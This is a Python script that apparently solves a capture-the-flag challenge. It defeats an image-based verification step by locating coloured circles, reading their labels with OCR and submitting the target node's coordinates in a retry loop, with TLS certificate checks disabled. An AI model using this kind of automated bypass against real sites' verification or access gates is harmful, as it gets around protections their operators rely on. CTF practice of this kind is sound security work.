#!/usr/bin/env python3
import re, io, json, subprocess, tempfile, os, time
import urllib.request, ssl
import numpy as np
from PIL import Image

B = "https://kicyber-4bfe3faed6a6-locks-of-confusion1-0-0.chals.io"
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def get(path, data=None, headers=None):
    req = urllib.request.Request(B+path, data=data, headers=headers or {})
    return urllib.request.urlopen(req, context=ctx, timeout=20).read()

def find_circles(img):
    a = np.asarray(img.convert("RGB")).astype(int)
    R,G,Bc = a[:,:,0],a[:,:,1],a[:,:,2]
    # blue-ish circle fill: blue dominant, not too dark, not white
    mask = (Bc>90)&(Bc<230)&(Bc>R+20)&(Bc>G+10)&(R>30)
    ys,xs = np.where(mask)
    pts = list(zip(xs.tolist(), ys.tolist()))
    clusters=[]  # list of [sumx,sumy,n, cx,cy]
    for x,y in pts:
        placed=False
        for c in clusters:
            if abs(x-c[3])<40 and abs(y-c[4])<40:
                c[0]+=x; c[1]+=y; c[2]+=1; c[3]=c[0]/c[2]; c[4]=c[1]/c[2]; placed=True; break
        if not placed:
            clusters.append([x,y,1,x,y])
    return [(int(c[3]),int(c[4]),c[2]) for c in clusters if c[2]>150]

def ocr_label(img, cx, cy):
    # label sits just below the circle
    crop = img.convert("L").crop((max(0,cx-55), cy+28, min(img.width,cx+55), min(img.height,cy+52)))
    crop = crop.resize((crop.width*4, crop.height*4))
    crop = crop.point(lambda p: 0 if p<110 else 255)  # white text -> black on white invert
    crop = Image.eval(crop, lambda p: 255-p)
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
        crop.save(f.name); fn=f.name
    try:
        out = subprocess.run(["tesseract", fn, "stdout", "--psm", "7",
             "-c","tessedit_char_whitelist=abcdefghijklmnopqrstuvwxyz0123456789-"],
             capture_output=True, text=True).stdout.strip().lower()
    finally:
        os.unlink(fn)
    return out

for attempt in range(60):
    html = get("/verify").decode()
    nonce = re.search(r'nonce = "([0-9a-f]+)"', html).group(1)
    png = get(f"/verify/image/{nonce}")
    img = Image.open(io.BytesIO(png))
    circles = find_circles(img)
    labels = [(cx,cy,ocr_label(img,cx,cy)) for cx,cy,_ in circles]
    names=[l[2] for l in labels]
    print(f"[{attempt}] nonce={nonce[:8]} nodes={names}")
    hit=None
    for cx,cy,lab in labels:
        if "cache-02" in lab or lab.replace(" ","")=="cache-02" or ("cache" in lab and "02" in lab):
            hit=(cx,cy); break
    if hit:
        body=json.dumps({"nonce":nonce,"x":hit[0],"y":hit[1]}).encode()
        try:
            resp=get("/verify/check", data=body, headers={"Content-Type":"application/json"}).decode()
        except Exception as e:
            resp=str(e)
        print("  -> cache-02 at",hit,"POST resp:",resp)
        if '"ok": true' in resp or '"ok":true' in resp:
            print("UNLOCKED"); break
    time.sleep(0.3)
